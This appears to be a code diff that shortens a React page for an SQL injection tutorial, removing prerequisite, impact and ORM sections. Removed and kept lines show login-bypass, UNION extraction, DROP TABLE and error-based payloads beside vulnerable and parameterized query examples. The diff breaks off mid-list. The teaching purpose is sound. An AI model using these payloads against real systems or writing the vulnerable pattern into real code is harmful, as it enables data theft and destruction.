@@ -605,7 +605,7 @@ const quizQuestions: QuizQuestion[] = [
     topic: "Detection",
     question: "Which pattern in logs indicates potential SQLi probing?",
     options: [
-      `Multiple requests with ', ", --, and # characters`,
+      "Multiple requests with ', \", --, and # characters",
       "Normal GET requests",
       "Image file downloads",
       "CSS file requests",
@@ -1317,18 +1317,16 @@ const SQLInjectionPage: React.FC = () => {
   const [navDrawerOpen, setNavDrawerOpen] = useState(false);
   const [activeSection, setActiveSection] = useState("");
 
-  const pageContext = `SQL Injection (SQLi) - A comprehensive guide covering injection attack types including Union-based SQLi, Blind SQLi (Boolean and Time-based), Error-based SQLi, Out-of-band SQLi. Topics include: query structure, parameter manipulation, authentication bypass, data extraction, second-order injection, impact and risk, ORM pitfalls, stored procedures exploitation, prevention techniques like parameterized queries, prepared statements, input validation, and secure database design patterns.`;
+  const pageContext = `SQL Injection (SQLi) - A comprehensive guide covering injection attack types including Union-based SQLi, Blind SQLi (Boolean and Time-based), Error-based SQLi, Out-of-band SQLi. Topics include: query structure, parameter manipulation, authentication bypass, data extraction, second-order injection, stored procedures exploitation, prevention techniques like parameterized queries, prepared statements, input validation, and secure database design patterns.`;
 
   // Section Navigation Items
   const sectionNavItems = [
     { id: "intro", label: "Introduction", icon: <SchoolIcon /> },
-    { id: "impact-risk", label: "Impact & Risk", icon: <WarningIcon /> },
     { id: "how-it-works", label: "How It Works", icon: <CodeIcon /> },
     { id: "sqli-types", label: "Injection Types", icon: <BugReportIcon /> },
     { id: "entry-points", label: "Entry Points", icon: <ApiIcon /> },
     { id: "detection", label: "Detection", icon: <SearchIcon /> },
     { id: "prevention", label: "Prevention", icon: <ShieldIcon /> },
-    { id: "orm-pitfalls", label: "ORM Pitfalls", icon: <MemoryIcon /> },
     { id: "secure-code", label: "Secure Code Examples", icon: <LockIcon /> },
     { id: "db-specific", label: "Database Specifics", icon: <StorageIcon /> },
     { id: "payloads", label: "Common Payloads", icon: <DataObjectIcon /> },
@@ -1698,319 +1696,62 @@ const SQLInjectionPage: React.FC = () => {
                 Introduction to SQL Injection
               </Typography>
 
-              {/* Prerequisites Box */}
-              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
-                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
-                  Prerequisites - What You Should Know
-                </Typography>
-                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                  Before diving into SQL injection, it helps to understand a few basics. Don't worry if you're not an expert -
-                  we'll explain everything as we go, but having some familiarity with these concepts will make learning easier:
-                </Typography>
-                <Grid container spacing={2}>
-                  <Grid item xs={12} md={6}>
-                    <List dense>
-                      <ListItem>
-                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
-                        <ListItemText
-                          primary="Basic SQL commands"
-                          secondary="SELECT, INSERT, UPDATE, DELETE - the fundamental operations for reading and modifying data"
-                        />
-                      </ListItem>
-                      <ListItem>
-                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
-                        <ListItemText
-                          primary="What a database is"
-                          secondary="A structured collection of data organized into tables with rows and columns"
-                        />
-                      </ListItem>
-                      <ListItem>
-                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
-                        <ListItemText
-                          primary="How web forms work"
-                          secondary="Text boxes, buttons, and how data gets sent from your browser to a server"
-                        />
-                      </ListItem>
-                    </List>
-                  </Grid>
-                  <Grid item xs={12} md={6}>
-                    <List dense>
-                      <ListItem>
-                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
-                        <ListItemText
-                          primary="Client-server model"
-                          secondary="Your browser (client) sends requests, the server processes them and sends responses"
-                        />
-                      </ListItem>
-                      <ListItem>
-                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
-                        <ListItemText
-                          primary="Basic programming concepts"
-                          secondary="Variables, strings, and how programs combine text (concatenation)"
-                        />
-                      </ListItem>
-                      <ListItem>
-                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
-                        <ListItemText
-                          primary="HTTP basics"
-                          secondary="GET and POST requests - how data travels between your browser and websites"
-                        />
-                      </ListItem>
-                    </List>
-                  </Grid>
-                </Grid>
-              </Paper>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
-                What is SQL Injection?
+              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
+                SQL Injection (SQLi) is one of the oldest and most dangerous web application vulnerabilities. It occurs when
+                an application builds database queries by concatenating user input directly into SQL commands. The database
+                cannot distinguish between the developer's intended query and the attacker's malicious input, so it executes
+                the entire string as code.
               </Typography>
 
               <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                SQL Injection (often abbreviated as SQLi) is one of the oldest and most dangerous web application vulnerabilities,
-                first documented in the late 1990s. Despite being well-understood for over two decades, it consistently remains
-                in the OWASP Top 10 list of critical security risks. Why? Because it's easy to introduce accidentally and
-                devastating when exploited.
+                The core problem is simple: <strong>data is treated as code</strong>. When you type a search term into a web form,
+                that text should be treated as data. But if the application inserts it directly into a SQL query string,
+                an attacker can craft input that changes the query's meaning entirely.
               </Typography>
 
               <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                At its core, SQL injection occurs when an application builds database queries by directly inserting user input
-                into SQL commands. The database has no way to tell the difference between the developer's intended query and
-                the attacker's malicious additions - it simply executes whatever SQL string it receives.
-              </Typography>
-
-              {/* Analogy Box */}
-              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
-                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
-                  Real-World Analogy: The Library Card System
-                </Typography>
-                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
-                  Imagine a library where you fill out a card to request a book. You write "Harry Potter" and hand it to the librarian,
-                  who has a form that says "Please get me the book called [your input] from the shelf." This works fine for normal requests.
-                </Typography>
-                <Typography variant="body2" sx={{ mt: 1, lineHeight: 1.7 }}>
-                  But what if you wrote: <strong>"Harry Potter" and also "empty the cash register"</strong>? If the librarian blindly
-                  follows instructions without questioning them, you've just "injected" an unauthorized command. SQL injection works
-                  the same way - attackers craft special input that becomes part of the database command itself.
-                </Typography>
-              </Paper>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
-                The Core Problem: Data Treated as Code
+                Consider a login form that checks credentials with this query: <code>SELECT * FROM users WHERE username='$input' AND password='$pass'</code>.
+                An attacker entering <code>' OR '1'='1</code> as the username transforms the query into one that always returns true,
+                bypassing authentication entirely.
               </Typography>
 
               <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                The fundamental issue is simple but critical: <strong>user-supplied data is being treated as executable code</strong>.
-                When you type a search term into a web form, that text should be treated purely as data - a value to look up.
-                But if the application concatenates (combines) your input directly into a SQL query string, an attacker can
-                craft special input that changes the query's meaning entirely.
+                SQLi is not just a web problem. APIs, mobile apps, internal dashboards, data pipelines, and any system
+                that accepts input and builds SQL queries can be vulnerable. Attackers look for any path that lets them
+                influence query structure - search forms, filters, sorting parameters, URL parameters, cookies, and HTTP headers.
               </Typography>
 
               <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Consider a simple login form. Behind the scenes, the application might check your credentials like this:
-              </Typography>
-
-              <CodeBlock
-                language="sql"
-                title="What the developer intended"
-                code={`SELECT * FROM users WHERE username = 'john' AND password = 'secret123'
--- This returns the user record IF both username AND password match`}
-              />
-
-              <Typography variant="body1" sx={{ mb: 2, mt: 2, lineHeight: 1.8 }}>
-                But if the application just concatenates user input, an attacker can enter <code>' OR '1'='1</code> as the
-                username. The query becomes:
-              </Typography>
-
-              <CodeBlock
-                language="sql"
-                title="What the attacker makes it do"
-                code={`SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
--- The OR '1'='1' is always true, so this returns ALL users!
--- The attacker bypasses login without knowing any password`}
-              />
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
-                Why This Matters
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                SQL injection isn't just a theoretical concern - it has caused some of the largest data breaches in history.
-                Through SQLi, attackers can:
-              </Typography>
-
-              <Grid container spacing={2} sx={{ mb: 3 }}>
-                {[
-                  { icon: <SearchIcon />, title: "Read sensitive data", desc: "Access customer records, passwords, credit cards, medical records - anything in the database" },
-                  { icon: <WarningIcon />, title: "Modify or delete data", desc: "Change prices, transfer money, delete records, or corrupt entire databases" },
-                  { icon: <LockIcon />, title: "Bypass authentication", desc: "Log in as any user including administrators without knowing passwords" },
-                  { icon: <TerminalIcon />, title: "Execute system commands", desc: "In some configurations, run operating system commands on the server" },
-                ].map((item, idx) => (
-                  <Grid item xs={12} sm={6} key={idx}>
-                    <Paper sx={{ p: 2, height: "100%", bgcolor: alpha("#ef4444", 0.03), borderRadius: 2 }}>
-                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
-                        <Box sx={{ color: "#ef4444" }}>{item.icon}</Box>
-                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.title}</Typography>
-                      </Box>
-                      <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
-                    </Paper>
-                  </Grid>
-                ))}
-              </Grid>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
-                Where SQL Injection Can Occur
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                SQLi is not limited to web applications. Any system that accepts input and builds SQL queries can be vulnerable.
-                This includes:
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                <strong>Web applications</strong> - Login forms, search boxes, contact forms, shopping carts, user profiles.
-                <strong> APIs</strong> - REST endpoints, GraphQL queries, SOAP services that accept parameters.
-                <strong> Mobile apps</strong> - Any app that communicates with a backend database.
-                <strong> Desktop applications</strong> - Software that connects to SQL databases.
-                <strong> Internal tools</strong> - Admin panels, reporting systems, data import utilities.
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Attackers look for any path that lets them influence query structure - form fields, URL parameters, cookies,
-                HTTP headers (like User-Agent or Referer), and even file upload names. If it reaches a SQL query, it's a
-                potential attack vector.
-              </Typography>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
-                The Solution: Separation of Code and Data
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                The fix for SQL injection is conceptually simple: <strong>never treat user input as part of the SQL command</strong>.
-                Instead, use parameterized queries (also called prepared statements). With this approach, you define the SQL
-                structure first, then pass user data separately. The database knows exactly which parts are commands and which
-                are data - and it will never execute data as commands.
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                This isn't about clever filtering or trying to detect malicious input. Those approaches are error-prone and
-                can be bypassed. Parameterization is the fundamental fix because it addresses the root cause: keeping code
-                and data completely separate.
+                The fix is not clever filtering or escaping. The real solution is to <strong>keep data and code separate</strong> using
+                parameterized queries (prepared statements). When parameters are used, the database understands which parts
+                are data and will never execute them as commands. This makes SQLi one of the most preventable vulnerabilities -
+                yet it remains in the OWASP Top 10 year after year.
               </Typography>
 
               <Alert severity="success" sx={{ mt: 3, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>What You'll Learn in This Guide</AlertTitle>
+                <AlertTitle sx={{ fontWeight: 700 }}>What You'll Learn</AlertTitle>
                 <Grid container spacing={2}>
                   <Grid item xs={12} sm={6} md={3}>
-                    <Typography variant="body2">&#8226; How SQLi attacks work step-by-step</Typography>
-                    <Typography variant="body2">&#8226; Different injection types explained</Typography>
-                    <Typography variant="body2">&#8226; Common entry points to audit</Typography>
-                    <Typography variant="body2">&#8226; Impact and risk assessment basics</Typography>
+                    <Typography variant="body2">&#8226; How SQLi attacks work</Typography>
+                    <Typography variant="body2">&#8226; Different injection types</Typography>
+                    <Typography variant="body2">&#8226; Common entry points</Typography>
                   </Grid>
                   <Grid item xs={12} sm={6} md={3}>
-                    <Typography variant="body2">&#8226; Detection techniques and signals</Typography>
-                    <Typography variant="body2">&#8226; Database-specific syntax differences</Typography>
-                    <Typography variant="body2">&#8226; How attackers bypass WAFs</Typography>
+                    <Typography variant="body2">&#8226; Detection techniques</Typography>
+                    <Typography variant="body2">&#8226; Database-specific syntax</Typography>
+                    <Typography variant="body2">&#8226; WAF bypass methods</Typography>
                   </Grid>
                   <Grid item xs={12} sm={6} md={3}>
-                    <Typography variant="body2">&#8226; Prevention strategies that work</Typography>
-                    <Typography variant="body2">&#8226; Secure code patterns in multiple languages</Typography>
-                    <Typography variant="body2">&#8226; ORM best practices and pitfalls</Typography>
-                    <Typography variant="body2">&#8226; Safe query builder and raw SQL patterns</Typography>
+                    <Typography variant="body2">&#8226; Prevention strategies</Typography>
+                    <Typography variant="body2">&#8226; Secure code patterns</Typography>
+                    <Typography variant="body2">&#8226; ORM best practices</Typography>
                   </Grid>
                   <Grid item xs={12} sm={6} md={3}>
-                    <Typography variant="body2">&#8226; SQLMap tool usage for testing</Typography>
-                    <Typography variant="body2">&#8226; Real-world breach case studies</Typography>
-                    <Typography variant="body2">&#8226; Safe testing methodologies</Typography>
+                    <Typography variant="body2">&#8226; SQLMap usage</Typography>
+                    <Typography variant="body2">&#8226; Real-world case studies</Typography>
+                    <Typography variant="body2">&#8226; Testing methodologies</Typography>
                   </Grid>
                 </Grid>
-              </Alert>
-            </Paper>
-
-            {/* ========== SECTION: IMPACT & RISK ========== */}
-            <Paper
-              id="impact-risk"
-              sx={{
-                p: 4,
-                mb: 5,
-                borderRadius: 4,
-                bgcolor: alpha(theme.palette.background.paper, 0.6),
-                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
-                scrollMarginTop: 96,
-              }}
-            >
-              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
-                <WarningIcon sx={{ color: accent }} />
-                Impact and Risk
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                SQL injection is classified as a critical risk because it targets the database directly. If attackers can
-                control a query, they can often bypass application logic, read sensitive data, and modify or destroy records.
-                The impact is not limited to one page or feature. It can compromise the entire data layer.
-              </Typography>
-
-              <Grid container spacing={3} sx={{ mb: 3 }}>
-                {[
-                  {
-                    title: "Confidentiality",
-                    desc: "Exfiltration of user data, credentials, tokens, or internal business records.",
-                    color: "#ef4444",
-                  },
-                  {
-                    title: "Integrity",
-                    desc: "Unauthorized changes such as role escalation, tampering with orders, or edits to audit logs.",
-                    color: "#f59e0b",
-                  },
-                  {
-                    title: "Availability",
-                    desc: "Dropping tables, lock contention, or resource exhaustion that takes services offline.",
-                    color: "#8b5cf6",
-                  },
-                  {
-                    title: "Compliance and Legal",
-                    desc: "Regulatory exposure for PII and financial data, breach notifications, and fines.",
-                    color: "#3b82f6",
-                  },
-                ].map((item) => (
-                  <Grid item xs={12} sm={6} key={item.title}>
-                    <Paper sx={{ p: 2.5, borderRadius: 2, border: `1px solid ${alpha(item.color, 0.2)}`, height: "100%" }}>
-                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: item.color, mb: 1 }}>
-                        {item.title}
-                      </Typography>
-                      <Typography variant="body2" color="text.secondary">
-                        {item.desc}
-                      </Typography>
-                    </Paper>
-                  </Grid>
-                ))}
-              </Grid>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
-                Common Attacker Objectives
-              </Typography>
-
-              <Grid container spacing={2} sx={{ mb: 2 }}>
-                {[
-                  "Bypass authentication to access protected accounts",
-                  "Enumerate database schema and discover sensitive tables",
-                  "Extract credentials, PII, or payment data",
-                  "Modify records to change prices, roles, or inventory",
-                  "Plant backdoors or create rogue admin users",
-                  "Cover tracks by deleting logs or audit trails",
-                ].map((item) => (
-                  <Grid item xs={12} md={6} key={item}>
-                    <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1 }}>
-                      <CheckCircleIcon sx={{ color: accent, mt: 0.3 }} fontSize="small" />
-                      <Typography variant="body2">{item}</Typography>
-                    </Box>
-                  </Grid>
-                ))}
-              </Grid>
-
-              <Alert severity="warning" sx={{ mt: 2, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>Risk Reality Check</AlertTitle>
-                Treat any confirmed SQL injection as a high-severity issue. Even a "read-only" injection can expose
-                sensitive data or be chained with other weaknesses to achieve full compromise.
               </Alert>
             </Paper>
 
@@ -2031,49 +1772,21 @@ const SQLInjectionPage: React.FC = () => {
                 How SQL Injection Works
               </Typography>
 
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                To understand SQL injection, you need to understand how web applications typically interact with databases.
-                When you fill out a form on a website - like a login page or search box - that data travels from your
-                browser to a web server. The server then needs to look up or modify information in a database.
+              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
+                SQL injection exploits the way applications construct database queries. When user input is concatenated
+                directly into SQL strings without proper handling, attackers can inject their own SQL code.
               </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                To communicate with the database, the application constructs a SQL (Structured Query Language) command.
-                SQL is the standard language for telling databases what to do: "find this record," "add this user,"
-                "delete this order," and so on. The problem arises in <strong>how</strong> these commands are built.
-              </Typography>
-
-              {/* Analogy Box */}
-              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
-                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1, color: "#8b5cf6" }}>
-                  Think of it Like a Mad Libs Game
-                </Typography>
-                <Typography variant="body2" sx={{ lineHeight: 1.7, mb: 1 }}>
-                  Remember Mad Libs? You have a story with blanks, and you fill in words: "The [ADJECTIVE] [NOUN] went to the [PLACE]."
-                  If someone writes "happy cat" and "park," you get a normal story.
-                </Typography>
-                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
-                  But what if someone writes: <strong>"happy cat went to the park. THE END. New story: The evil villain stole everything"</strong>?
-                  They've broken out of the intended structure and injected their own content. SQL injection works exactly this way -
-                  attackers write input that "breaks out" of where it should go and becomes part of the command itself.
-                </Typography>
-              </Paper>
 
               <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
-                The Attack Flow - Step by Step
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
-                Let's walk through exactly what happens during a SQL injection attack. Understanding each step helps you
-                see why this vulnerability exists and how to prevent it.
+                The Attack Flow
               </Typography>
 
               <Grid container spacing={2} sx={{ mb: 4 }}>
                 {[
-                  { step: 1, title: "User Submits Input", desc: "Someone types data into a form, URL, or sends it via an API. This could be a login form, search box, or any input field." },
-                  { step: 2, title: "Server Receives Data", desc: "The web server receives this input. At this point, it's just text - the server doesn't know if it's legitimate or malicious." },
-                  { step: 3, title: "Query is Constructed", desc: "The application builds a SQL command by inserting the user's input into a template. This is where things can go wrong." },
-                  { step: 4, title: "Database Executes", desc: "The complete SQL string is sent to the database, which runs it. The database has no idea which parts came from the developer and which from the user." },
+                  { step: 1, title: "Input Arrives", desc: "User input comes from a form, URL parameter, header, or API request" },
+                  { step: 2, title: "Query Built", desc: "The application concatenates this input into a SQL query string" },
+                  { step: 3, title: "Query Executed", desc: "The database receives and executes the full string as SQL code" },
+                  { step: 4, title: "Attack Succeeds", desc: "If input changes query meaning, the attacker gains unauthorized access" },
                 ].map((item) => (
                   <Grid item xs={12} sm={6} md={3} key={item.step}>
                     <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha(accent, 0.05), borderRadius: 2, height: "100%" }}>
@@ -2085,232 +1798,44 @@ const SQLInjectionPage: React.FC = () => {
                 ))}
               </Grid>
 
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
-                A Detailed Example: The Login Form
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Let's look at a concrete example. Imagine a simple login page where users enter their email and password.
-                Here's what happens behind the scenes when a developer writes insecure code:
-              </Typography>
-
-              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
-                The Vulnerable Application Code:
+              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
+                Vulnerable Code Example
               </Typography>
               <CodeBlock
                 language="javascript"
-                title="INSECURE: How NOT to build a login query"
-                code={`// The user submitted these values from the login form:
-const email = req.body.email;      // Whatever the user typed
-const password = req.body.password; // Whatever the user typed
+                title="INSECURE: String concatenation"
+                code={`// VULNERABLE - Never do this!
+const email = req.body.email;
+const query = "SELECT * FROM users WHERE email = '" + email + "'";
+db.query(query);
 
-// DANGER: The developer builds the query by concatenating strings
-const query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";
-
-// This query is sent to the database
-db.query(query);`}
+// If email = "' OR '1'='1" the query becomes:
+// SELECT * FROM users WHERE email = '' OR '1'='1'
+// This returns ALL users!`}
               />
-
-              <Typography variant="body1" sx={{ mb: 2, mt: 3, lineHeight: 1.8 }}>
-                When a legitimate user enters their email <code>alice@example.com</code> and password <code>mypassword</code>,
-                the query becomes:
-              </Typography>
-
-              <CodeBlock
-                language="sql"
-                title="Normal login - what should happen"
-                code={`SELECT * FROM users WHERE email = 'alice@example.com' AND password = 'mypassword'
-
--- This query says: "Find me a user where BOTH the email matches AND the password matches"
--- If both are correct, the user is logged in. If not, login fails. This is expected behavior.`}
-              />
-
-              <Typography variant="body1" sx={{ mb: 2, mt: 3, lineHeight: 1.8 }}>
-                But what if an attacker enters <code>' OR '1'='1' --</code> as the email? Let's trace through what happens:
-              </Typography>
-
-              <CodeBlock
-                language="sql"
-                title="Attack input - how the injection works"
-                code={`-- The attacker enters this as the email field:
-' OR '1'='1' --
-
--- The password field can be anything (or empty)
-
--- After concatenation, the query becomes:
-SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'whatever'
-
--- Let's break this down:
--- email = ''         → This part is false (empty string doesn't match)
--- OR '1'='1'         → This is ALWAYS true (1 always equals 1)
--- --                 → This is a SQL comment, everything after is ignored!
-
--- So the query effectively becomes:
-SELECT * FROM users WHERE (false) OR (true)
--- Which simplifies to:
-SELECT * FROM users WHERE true
--- This returns ALL users in the database!`}
-              />
-
-              <Alert severity="error" sx={{ my: 3, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>What Just Happened?</AlertTitle>
-                <Typography variant="body2" sx={{ mb: 1 }}>
-                  The attacker used special characters to <strong>break out</strong> of the intended query structure:
-                </Typography>
-                <List dense>
-                  <ListItem><ListItemText primary="The single quote (') closed the email string early" /></ListItem>
-                  <ListItem><ListItemText primary="OR '1'='1' added a condition that's always true" /></ListItem>
-                  <ListItem><ListItemText primary="The double dash (--) commented out the rest of the query" /></ListItem>
-                </List>
-                <Typography variant="body2">
-                  The database received what looked like a valid SQL command and executed it. It has no way to know that
-                  part of the command came from an attacker rather than the application.
-                </Typography>
-              </Alert>
 
               <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: "#22c55e" }}>
-                The Secure Way: Parameterized Queries
+                Secure Code Example
               </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Now let's see how to write this correctly. With parameterized queries (also called prepared statements),
-                you separate the SQL structure from the data. The database receives them separately and knows which is which.
-              </Typography>
-
               <CodeBlock
                 language="javascript"
-                title="SECURE: Using parameterized queries"
-                code={`// The user submitted these values:
+                title="SECURE: Parameterized query"
+                code={`// SECURE - Use parameterized queries
 const email = req.body.email;
-const password = req.body.password;
+const query = "SELECT * FROM users WHERE email = ?";
+db.query(query, [email]);
 
-// SECURE: Use placeholders (?) for user data
-const query = "SELECT * FROM users WHERE email = ? AND password = ?";
-
-// Pass the data separately - the database knows these are DATA, not CODE
-db.query(query, [email, password]);
-
-// Even if someone enters ' OR '1'='1' -- as the email,
-// the database will search for a user with that LITERAL email address
-// (which doesn't exist), not execute it as SQL code.`}
+// The database treats email as DATA, not CODE
+// Even if email = "' OR '1'='1", it searches for that literal string`}
               />
 
-              <Typography variant="body1" sx={{ mb: 2, mt: 3, lineHeight: 1.8 }}>
-                With parameterized queries, here's what the database actually does:
-              </Typography>
-
-              <Grid container spacing={2} sx={{ mb: 3 }}>
-                <Grid item xs={12} md={4}>
-                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>1. Parse Structure First</Typography>
-                    <Typography variant="body2">
-                      The database parses "SELECT * FROM users WHERE email = ? AND password = ?" and understands the query structure
-                      before seeing any data.
-                    </Typography>
-                  </Paper>
-                </Grid>
-                <Grid item xs={12} md={4}>
-                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>2. Receive Data Separately</Typography>
-                    <Typography variant="body2">
-                      The email and password values are sent separately. The database knows these go into the placeholders as
-                      literal data values.
-                    </Typography>
-                  </Paper>
-                </Grid>
-                <Grid item xs={12} md={4}>
-                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>3. Safe Execution</Typography>
-                    <Typography variant="body2">
-                      No matter what characters are in the data, they cannot change the query structure. Single quotes, dashes,
-                      and SQL keywords are treated as literal text.
-                    </Typography>
-                  </Paper>
-                </Grid>
-              </Grid>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
-                Other Common SQL Injection Patterns
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                The login bypass is just one example. Attackers use many different techniques depending on what they're trying to achieve:
-              </Typography>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 600 }}>Data Extraction with UNION</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2 }}>
-                    The UNION command combines results from two queries. Attackers use it to append their own query and extract
-                    data from other tables:
-                  </Typography>
-                  <CodeBlock
-                    language="sql"
-                    code={`-- Original query looking for products:
-SELECT name, price FROM products WHERE id = 1
-
--- Attacker input: 1 UNION SELECT username, password FROM users--
--- Resulting query:
-SELECT name, price FROM products WHERE id = 1 UNION SELECT username, password FROM users--
-
--- This returns product info PLUS all usernames and passwords!`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 600 }}>Data Modification with Stacked Queries</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2 }}>
-                    Some databases allow multiple statements separated by semicolons. Attackers can add their own destructive commands:
-                  </Typography>
-                  <CodeBlock
-                    language="sql"
-                    code={`-- Original query:
-SELECT * FROM products WHERE id = 1
-
--- Attacker input: 1; DROP TABLE users;--
--- Resulting queries:
-SELECT * FROM products WHERE id = 1; DROP TABLE users;--
-
--- This runs the original query, then DELETES the entire users table!`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
-              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 600 }}>Information Gathering with Errors</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2 }}>
-                    Even error messages can leak valuable information. Attackers intentionally cause errors to learn about the database:
-                  </Typography>
-                  <CodeBlock
-                    language="sql"
-                    code={`-- Attacker causes an error by using an invalid conversion:
-SELECT * FROM products WHERE id = CONVERT(int, @@version)
-
--- Error message reveals:
--- "Conversion failed when converting the nvarchar value
--- 'Microsoft SQL Server 2019...' to data type int"
-
--- Now the attacker knows the exact database version!`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
               <Alert severity="info" sx={{ mt: 3, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>Key Takeaways</AlertTitle>
+                <AlertTitle sx={{ fontWeight: 700 }}>Why Parameterization Works</AlertTitle>
                 <List dense>
-                  <ListItem><ListItemText primary="SQL injection happens when user input becomes part of the SQL command structure" /></ListItem>
-                  <ListItem><ListItemText primary="The database can't tell the difference between developer code and injected attacker code" /></ListItem>
-                  <ListItem><ListItemText primary="Parameterized queries keep code and data completely separate - this is the fix" /></ListItem>
